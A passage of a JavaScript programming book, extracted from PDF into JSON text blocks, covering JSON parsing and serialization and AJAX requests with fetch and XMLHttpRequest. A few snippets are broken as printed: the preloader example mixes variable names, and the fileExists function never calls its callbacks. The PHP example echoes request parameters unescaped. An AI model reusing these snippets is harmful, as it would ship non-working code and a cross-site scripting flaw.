        "text": "If a  number  is provided, then  space  number of whitespaces will be inserted of readability. If a  string  is provided, the string (\ufb01rst 10 characters) will be used as whitespaces. JSON (JavaScript Object Notation) is a lightweight data-interchange format. It is easy for humans to read and write and easy for machines to parse and generate. It is important to realize that, in JavaScript, JSON is a string and not an object. A basic overview can be found on the  json.org  website which also contains links to implementations of the standard in many di\ufb00erent programming languages.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.1: JSON versus JavaScript literals",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JSON stands for \"JavaScript Object Notation\", but it's not JavaScript. Think of it as just a  data serialization format  that happens  to be directly usable as a JavaScript literal. However, it is not advisable to directly run (i.e. through  eval () ) JSON that is fetched from an external source. Functionally, JSON isn't very di\ufb00erent from XML or YAML  \u2013  some confusion can be avoided if JSON is just imagined as some serialization format that looks very much like JavaScript. Even though the name implies just objects, and even though the majority of use cases through some kind of API always happen to be objects and arrays, JSON is not for just objects or arrays. The following primitive types are supported: String (e.g.  \"Hello World!\" ) Number (e.g.  42 ) Boolean (e.g.  true ) The value  null undefined  is not supported in the sense that an unde\ufb01ned property will be omitted from JSON upon serialization. Therefore, there is no way to deserialize JSON and end up with a property whose value is  undefined . The string  \"42\"  is valid JSON. JSON doesn't always have to have an outer envelope of  \"{...}\"  or  \"[...]\" . While some JSON is also valid JavaScript and some JavaScript is also valid JSON, there are some subtle di\ufb00erences between both languages and neither language is a subset of the other. Take the following JSON string as an example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "{ \"color\" :   \"blue\" }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This can be directly inserted into JavaScript. It will be syntactically valid and will yield the correct value:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  skin  =   { \"color\" :   \"blue\" };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 235",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "However, we know that \"color\" is a valid identi\ufb01er name and the quotes around the property name can be omitted:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  skin  =   { color :   \"blue\" };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We also know that we can use single quotes instead of double quotes:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  skin  =   { 'color' :   'blue' };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But, if we were to take both of these literals and treat them as JSON,  neither will be syntactically valid  JSON:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "{ color :   \"blue\" } { 'color' :   'blue' }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "JSON strictly requires all property names to be double quoted and string values to be double quoted as well. It's common for JSON-newcomers to attempt to use code excerpts with JavaScript literals as JSON, and scratch their heads about the syntax errors they are getting from the JSON parser. More confusion starts arising when  incorrect terminology  is applied in code or in conversation. A common anti-pattern is to name variables that hold non-JSON values as \"json\":",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fetch ( url ) . then ( function   ( response )   {    const  json  =  JSON. parse ( response. data );   // Confusion ensues!",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // We're done with the notion of \"JSON\" at this point,    // but the concept stuck with the variable name. });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the above example,  response. data  is a JSON string that is returned by some API. JSON stops at the HTTP response domain. The variable with the \"json\" misnomer holds just a JavaScript value (could be an object, an array, or even a simple number!) A less confusing way to write the above is:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fetch ( url ) . then ( function   ( response )   {    const  value  =  JSON. parse ( response. data );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // We're done with the notion of \"JSON\" at this point.    // You don't talk about JSON after parsing JSON. });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Developers also tend to throw the phrase \"JSON object\" around a lot. This also leads to confusion. Because as mentioned above, a JSON string doesn't have to hold an object as a value. \"JSON string\" is a better term. Just like \"XML string\" or \"YAML string\". You get a string, you parse it, and you end up with a value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.2: Parsing with a reviver function",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A reviver function can be used to \ufb01lter or transform the value being parsed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  jsonString  =   '[{\"name\":\"John\",\"score\":51},{\"name\":\"Jack\",\"score\":17}]' ; var  data  =  JSON. parse ( jsonString ,   function  reviver ( key ,  value )   {    return  key  ===   'name'   ?  value. toUpperCase ()   :  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 236",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "const  jsonString  =   '[{\"name\":\"John\",\"score\":51},{\"name\":\"Jack\",\"score\":17}]' ; const  data  =  JSON. parse ( jsonString ,   ( key ,  value )   =>   key  ===   'name'   ?  value. toUpperCase ()   :  value );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This produces the following result: [    {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     'name' :   'JOHN' ,      'score' :   51    },    {      'name' :   'JACK' ,      'score' :   17    } ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This is particularly useful when data must be sent that needs to be serialized/encoded when being transmitted with JSON, but one wants to access it deserialized/decoded. In the following example, a date was encoded to its ISO 8601 representation. We use the reviver function to parse this in a JavaScript  Date .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  jsonString  =   '{\"date\":\"2016-01-04T23:00:00.000Z\"}' ; var  data  =  JSON. parse ( jsonString ,   function   ( key ,  value )   {    return   ( key  ===   'date' )   ?   new  Date ( value )   :  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "const  jsonString  =   '{\"date\":\"2016-01-04T23:00:00.000Z\"}' ; const  data  =  JSON. parse ( jsonString ,   ( key ,  value )   =>   key  ===   'date'   ?   new  Date ( value )   :  value );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is important to make sure the reviver function returns a useful value at the end of each iteration. If the reviver function returns  undefined , no value or the execution falls o\ufb00 towards the end of the function, the property is deleted from the object. Otherwise, the property is rede\ufb01ned to be the return value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.3: Serializing a value",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A JavaScript value can be converted to a JSON string using the  JSON. stringify  function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JSON. stringify ( value [,  replacer [,  space ]])",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "value  The value to convert to a JSON string. 1.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "/* Boolean */   JSON. stringify ( true )               // 'true' /* Number  */   JSON. stringify ( 12 )                 // '12' /* String  */   JSON. stringify ( 'foo' )              // '\"foo\"' /* Object  */   JSON. stringify ({})                 // '{}'                JSON. stringify ({ foo :   'baz' })       // '{\"foo\": \"baz\"}'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "/* Array   */   JSON. stringify ([ 1 ,   true ,   'foo' ])   // '[1, true, \"foo\"]' /* Date    */   JSON. stringify ( new  Date ())         // '\"2016-08-06T17:25:23.588Z\"'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "/* Symbol  */   JSON. stringify ({ x : Symbol ()})       // '{}'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 237",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "replacer  A function that alters the behaviour of the stringi\ufb01cation process or an array of String and Number 2. objects that serve as a whitelist for \ufb01ltering the properties of the value object to be included in the JSON string. If this value is null or is not provided, all properties of the object are included in the resulting JSON string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// replacer as a function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  replacer  ( key ,  value )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Filtering out properties",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( typeof  value  ===   \"string\" )   {          return      }           return  value } var  foo  =   {  foundation :   \"Mozilla\" ,  model :   \"box\" ,  week :   45 ,  transport :   \"car\" ,  month :   7   } JSON. stringify ( foo ,  replacer )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// -> '{\"week\": 45, \"month\": 7}' // replacer as an array",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "JSON. stringify ( foo ,   [ 'foundation' ,   'week' ,   'month' ])",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// -> '{\"foundation\": \"Mozilla\", \"week\": 45, \"month\": 7}' // only the `foundation`, `week`, and `month` properties are kept",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "space  For readability, the number of spaces used for indentation may be speci\ufb01ed as the third parameter. 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JSON. stringify ({ x :   1 ,  y :   1 },   null ,   2 )    // 2 space characters will be used for indentation /* output:     {       'x': 1,       'y': 1     } */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Alternatively, a string value can be provided to use for indentation. For example, passing  ' \\t '  will cause the tab character to be used for indentation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JSON. stringify ({ x :   1 ,  y :   1 },   null ,   ' \\t ' )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "/* output:     {         'x': 1,         'y': 1     } */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 35.4: Serializing and restoring class instances",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can use a custom  toJSON  method and reviver function to transmit instances of your own class in JSON. If an object has a  toJSON  method, its result will be serialized instead of the object itself.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version < 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "function  Car ( color ,  speed )   {    this . color   =  color ;    this . speed   =  speed ; } Car. prototype . toJSON   =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    $type :   'com.example.Car' ,     color :   this . color ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 238",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    speed :   this . speed    }; }; Car. fromJSON   =   function ( data )   {    return   new  Car ( data. color ,  data. speed ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "class  Car  {   constructor ( color ,  speed )   {      this . color   =  color ;      this . speed   =  speed ;      this . id_   =  Math. random ();    }   toJSON ()   {      return   {       $type :   'com.example.Car' ,       color :   this . color ,       speed :   this . speed      };    }    static  fromJSON ( data )   {      return   new  Car ( data. color ,  data. speed );    } } var  userJson  =  JSON. stringify ({   name :   \"John\" ,   car :   new  Car ( 'red' ,   'fast' ) });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This produces the a string with the following content:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "{ \"name\" : \"John\" , \"car\" :{ \"$type\" : \"com.example.Car\" , \"color\" : \"red\" , \"speed\" : \"fast\" }} var  userObject  =  JSON. parse ( userJson ,   function  reviver ( key ,  value )   {    return   ( value  &&  value.$type  ===   'com.example.Car' )   ?  Car. fromJSON ( value )   :  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This produces the following object: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  name :   \"John\" ,   car :  Car  {     color :   \"red\" ,     speed :   \"fast\" ,     id_ :   0.19349242527065402    } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 35.5: Serializing with a replacer function",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A  replacer  function can be used to \ufb01lter or transform values being serialized.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  userRecords  =   [    { name :   \"Joe\" ,  points :   14.9 ,  level :   31.5 },    { name :   \"Jane\" ,  points :   35.5 ,  level :   74.4 },    { name :   \"Jacob\" ,  points :   18.5 ,  level :   41.2 },",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 239",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   { name :   \"Jessie\" ,  points :   15.1 ,  level :   28.1 }, ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Remove names and round numbers to integers to anonymize records before sharing",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  anonymousReport  =  JSON. stringify ( userRecords ,   ( key ,  value )   =>   key  ===   'name'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     ?   undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     :   ( typeof  value  ===   'number'   ?  Math. floor ( value )   :  value ) );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This produces the following string:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "'[{\"points\":14,\"level\":31},{\"points\":35,\"level\":74},{\"points\":18,\"level\":41},{\"points\":15,\"level\":2 8}]'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 35.6: Parsing a simple JSON string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  JSON. parse ()  method parses a string as JSON and returns a JavaScript primitive, array or object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  array  =  JSON. parse ( '[1, 2, \"c\", \"d\", {\"e\": false}]' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( array );   // logs: [1, 2, \"c\", \"d\", {e: false}]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 35.7: Cyclic object values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Not all objects can be converted to a JSON string. When an object has cyclic self-references, the conversion will fail. This is typically the case for hierarchical data structures where parent and child both reference each other:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  world  =   {   name :   'World' ,   regions :   [] }; world. regions . push ({   name :   'North America' ,   parent :   'America' }); console. log ( JSON. stringify ( world ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// {\"name\":\"World\",\"regions\":[{\"name\":\"North America\",\"parent\":\"America\"}]}",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "world. regions . push ({   name :   'Asia' ,   parent :  world }); console. log ( JSON. stringify ( world ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Uncaught TypeError: Converting circular structure to JSON",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As soon as the process detects a cycle, the exception is raised. If there were no cycle detection, the string would be in\ufb01nitely long.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 240",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 36: AJAX",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "AJAX stands for \"Asynchronous JavaScript and XML\". Although the name includes XML, JSON is more often used due to its simpler formatting and lower redundancy. AJAX allows the user to communicate with external resources without reloading the webpage.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.1: Sending and Receiving JSON Data via POST",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Fetch request promises initially return Response objects. These will provide response header information, but they don't directly include the response body, which may not have even loaded yet. Methods on the Response object such as  . json ()  can be used to wait for the response body to load, then parse it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  requestData  =   {   method  :   'getUsers' }; const  usersPromise  =  fetch ( '/api' ,   {   method  :   'POST' ,   body  :  JSON. stringify ( requestData ) }) . then ( response  =>   {    if   (! response. ok )   {      throw   new  Error ( \"Got non-2XX response from API server.\" );    }    return  response. json (); }) . then ( responseData  =>   {    return  responseData. users ; }); usersPromise. then ( users  =>   {   console. log ( \"Known users: \" ,  users ); },  error  =>   {   console. error ( \"Failed to fetch users due to error: \" ,  error ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 36.2: Add an AJAX preloader",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Here's a way to show a GIF preloader while an AJAX call is executing. We need to prepare our add and remove preloader functions:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  addPreloader ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // if the preloader doesn't already exist, add one to the page",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   if (! document. querySelector ( '#preloader' ))   {      var  preloaderHTML  =   '<img id=\"preloader\" src=\"https://goo.gl/cNhyvX\" />' ;     document. querySelector ( 'body' ) . innerHTML   +=  preloaderHTML ;    } } function  removePreloader ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // select the preloader element",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  preloader  =  document. querySelector ( '#preloader' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // if it exists, remove it from the page",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   if ( preloader )   {     preloader. remove ();    } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 241",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Now we're going to look at where to use these functions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  request  =   new  XMLHttpRequest ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Inside the  onreadystatechange  function you should have an if statement with condition:  request. readyState   ==   4",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "&&  request. status   ==   200 .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If  true : the request is \ufb01nished and response is ready that's where we'll use  removePreloader () . Else if  false : the request is still in progress, in this case we'll run the function  addPreloader ()",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "xmlhttp. onreadystatechange   =   function ()   {    if ( request. readyState   ==   4   &&  request. status   ==   200 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // the request has come to an end, remove the preloader",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    removePreloader ();    }   else   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // the request isn't finished, add the preloader",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    addPreloader ()    } }; xmlhttp. open ( 'GET' ,  your_file. php ,   true ); xmlhttp. send ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 36.3: Displaying the top JavaScript questions of the month from Stack Over\ufb02ow's API",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "We can make an AJAX request to  Stack Exchange's API  to retrieve a list of the top JavaScript questions for the month, then present them as a list of links. If the request fails or the returns an API error, our promise error handling displays the error instead.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "View live results on HyperWeb .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  url  =      'http://api.stackexchange.com/2.2/questions?site=stackoverflow'   +      '&tagged=javascript&sort=month&filter=unsafe&key=gik4BOCMC7J9doavgYteRw((' ; fetch ( url ) . then ( response  =>  response. json ()) . then ( data  =>   {    if   ( data. error_message )   {      throw   new  Error ( data. error_message );    }    const  list  =  document. createElement ( 'ol' );   document. body . appendChild ( list );    for   ( const   { title ,  link }  of data. items )   {      const  entry  =  document. createElement ( 'li' );      const  hyperlink  =  document. createElement ( 'a' );     entry. appendChild ( hyperlink );     list. appendChild ( entry );     hyperlink. textContent   =  title ;     hyperlink. href   =  link ;    } }) . then ( null ,  error  =>   {    const  message  =  document. createElement ( 'pre' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 242",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  document. body . appendChild ( message );   message. style . color   =   'red' ;   message. textContent   =  String ( error ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 36.4: Using GET with parameters",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This function runs an AJAX call using GET allowing us to send  parameters  (object) to a  \ufb01le  (string) and launch a callback  (function) when the request has been ended.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  ajax ( file ,  params ,  callback )   {    var  url  =  file  +   '?' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // loop through object and assemble the url",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  notFirst  =   false ;    for   ( var  key  in  params )   {      if   ( params. hasOwnProperty ( key ))   {       url  +=   ( notFirst  ?   '&'   :   '' )   +  key  +   \"=\"   +  params [ key ];      }     notFirst  =   true ;    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // create a AJAX call with url as parameter",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  xmlhttp  =   new  XMLHttpRequest ();   xmlhttp. onreadystatechange   =   function ()   {      if   ( xmlhttp. readyState   ==   4   &&  xmlhttp. status   ==   200 )   {       callback ( xmlhttp. responseText );      }    };   xmlhttp. open ( 'GET' ,  url ,   true );   xmlhttp. send (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here's how we use it:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "ajax ( 'cars.php' ,   { type : \"Volvo\" ,  model : \"300\" ,  color : \"purple\" },   function ( response )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // add here the code to be executed when data comes back to this page          // for example console.log(response) will show the AJAX response in console });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And the following shows how to retrieve the url parameters in  cars. php :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( isset ( $_REQUEST [ 'type' ],  $_REQUEST [ 'model' ],  $_REQUEST [ 'color' ]))   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // they are set, we can use them !",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  $response  =   'The color of your car is '  . $_REQUEST [ 'color' ]  .  '. ' ;   $response . =   'It is a '  . $_REQUEST [ 'type' ]  .  ' model '  . $_REQUEST [ 'model' ]  .  '!' ;   echo $response ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you had  console. log ( response )  in callback function the result in console would have been: The color of your car is purple. It is a Volvo model 300!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 243",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.5: Check if a \ufb01le exists via a HEAD request",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This function executes an AJAX request using the HEAD method allowing us to  check whether a \ufb01le exists in the directory  given as an argument. It also enables us to  launch a callback for each case  (success, failure).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  fileExists ( dir ,  successCallback ,  errorCallback )   {      var  xhttp  =   new  XMLHttpRequest ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     /* Check the status code of the request */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    xhttp. onreadystatechange   =   function ()   {          return   ( xhttp. status   !==   404 )   ?  successCallback  :  errorCallback ;      };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     /* Open and send the request */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    xhttp. open ( 'head' ,  dir ,   false );     xhttp. send (); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 36.6: Using GET and no parameters",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  xhttp  =   new  XMLHttpRequest (); xhttp. onreadystatechange   =   function   ()   {      if   ( xhttp. readyState   ===  XMLHttpRequest. DONE   &&  xhttp. status   ===   200 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         //parse the response in xhttp.responseText;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } }; xhttp. open ( \"GET\" ,   \"ajax_info.txt\" ,   true ); xhttp. send ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "The  fetch  API is a newer promise-based way to make asynchronous HTTP requests.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fetch ( '/' ) . then ( response  =>  response. text ()) . then ( text  =>   {   console. log ( \"The home page is \"   +  text. length   +   \" characters long.\" ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 36.7: Listening to AJAX events at a global level",
